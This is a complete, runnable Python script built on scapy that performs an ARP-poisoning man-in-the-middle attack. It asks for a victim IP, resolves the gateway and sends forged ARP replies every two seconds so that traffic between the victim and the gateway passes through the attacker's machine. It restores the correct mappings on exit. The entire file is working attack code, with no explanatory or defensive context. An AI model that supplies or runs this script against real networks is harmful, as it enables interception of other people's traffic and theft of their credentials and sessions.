from scapy.all import *
import time

victim_ip = input("Enter the victim's IP address: ")
gateway_ip = conf.route.route("0.0.0.0")[2]

victim_mac = getmacbyip(victim_ip)
gateway_mac = getmacbyip(gateway_ip)

attacker_mac = get_if_hwaddr("eth0")

# Tell victim "I'm the gateway"
poison_victim = ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
                    psrc=gateway_ip, hwsrc=attacker_mac)

# Tell gateway "I'm the victim"
poison_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                     psrc=victim_ip, hwsrc=attacker_mac)

print("[*] Starting ARP poisoning... Press Ctrl+C to stop.")
try:
    while True:
        send(poison_victim, verbose=0)
        send(poison_gateway, verbose=0)
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[!] Stopping. Restoring network...")

# Restore correct mappings
restore_victim = ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
                     psrc=gateway_ip, hwsrc=gateway_mac)

restore_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                      psrc=victim_ip, hwsrc=victim_mac)

send(restore_victim, count=3, verbose=0)
send(restore_gateway, count=3, verbose=0)


